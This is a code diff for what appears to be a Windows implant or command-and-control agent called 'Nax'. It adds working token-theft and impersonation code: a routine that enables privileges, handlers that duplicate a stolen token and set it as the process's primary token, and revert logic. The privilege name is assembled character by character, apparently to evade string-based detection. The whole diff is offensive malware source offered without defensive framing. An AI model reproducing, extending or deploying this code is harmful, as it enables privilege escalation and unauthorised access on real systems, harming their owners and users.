@@ -105,6 +105,31 @@ static UINT32 WriteLenStr( PBYTE p, const PCHAR s ) {
     return 2 + len;
 }
 
+static BOOL NaxEnablePrivilege( PNAX_INSTANCE Nax, const CHAR* privName ) {
+    if ( !Nax->Advapi32.LookupPrivilegeValueA || !Nax->Advapi32.AdjustTokenPrivileges )
+        return FALSE;
+
+    HANDLE hToken = NULL;
+    if ( !NT_SUCCESS( Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) || !hToken )
+        return FALSE;
+
+    LUID luid;
+    MmZero( &luid, sizeof( luid ) );
+    if ( !Nax->Advapi32.LookupPrivilegeValueA( NULL, privName, &luid ) ) {
+        Nax->Ntdll.NtClose( hToken );
+        return FALSE;
+    }
+
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount           = 1;
+    tp.Privileges[0].Luid       = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    BOOL ok = Nax->Advapi32.AdjustTokenPrivileges( hToken, FALSE, &tp, 0, NULL, NULL );
+    Nax->Ntdll.NtClose( hToken );
+    return ok;
+}
+
 /* ========= [ CMD_TOKEN_GETUID (0x50) ] ========= */
 
 FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
@@ -200,8 +225,30 @@ FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PB
         return NAX_ERR_NOMEM;
     }
 
-    if ( impersonate && Nax->Advapi32.ImpersonateLoggedOnUser ) {
-        Nax->Advapi32.ImpersonateLoggedOnUser( hToken );
+    if ( impersonate ) {
+        if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
+            Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
+
+        CHAR pn[30];
+        pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
+        pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
+        pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
+        pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
+        NaxEnablePrivilege( Nax, pn );
+
+        if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
+            HANDLE hPrimary = NULL;
+            if ( Nax->Advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
+                struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
+                Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+                Nax->Ntdll.NtClose( hPrimary );
+            }
+        }
+
+        if ( Nax->Advapi32.ImpersonateLoggedOnUser )
+            Nax->Advapi32.ImpersonateLoggedOnUser( hToken );
+
+        Nax->ActiveToken = hToken;
     }
 
     UINT32 pos = 0;
@@ -225,10 +272,31 @@ FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYT
         return NAX_ERR_FAIL;
     }
 
+    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
+        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
+
+    CHAR pn[30];
+    pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
+    pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
+    pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
+    pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
+    NaxEnablePrivilege( Nax, pn );
+
+    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
+        HANDLE hPrimary = NULL;
+        if ( Nax->Advapi32.DuplicateTokenEx( node->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
+            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
+            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+            Nax->Ntdll.NtClose( hPrimary );
+        }
+    }
+
     if ( !Nax->Advapi32.ImpersonateLoggedOnUser || !Nax->Advapi32.ImpersonateLoggedOnUser( node->Handle ) ) {
         NaxWriteWin32Err( out, out_len );
         return NAX_ERR_FAIL;
     }
+
+    Nax->ActiveToken = node->Handle;
 
     UINT32 pos = 0;
     pos += WriteLenStr( out + pos, node->User );
@@ -270,6 +338,7 @@ FUNC INT CmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE
         return NAX_ERR_FAIL;
     }
 
+    Nax->ActiveToken = NULL;
     *out_len = 0;
     return NAX_OK;
 }
@@ -282,6 +351,14 @@ FUNC INT CmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
         return NAX_ERR_FAIL;
     }
 
+    if ( Nax->OriginalPrimaryToken && Nax->Ntdll.NtSetInformationProcess ) {
+        struct { HANDLE Token; HANDLE Thread; } pat = { Nax->OriginalPrimaryToken, NULL };
+        Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+        Nax->Ntdll.NtClose( Nax->OriginalPrimaryToken );
+        Nax->OriginalPrimaryToken = NULL;
+    }
+
+    Nax->ActiveToken = NULL;
     *out_len = 0;
     return NAX_OK;
 }
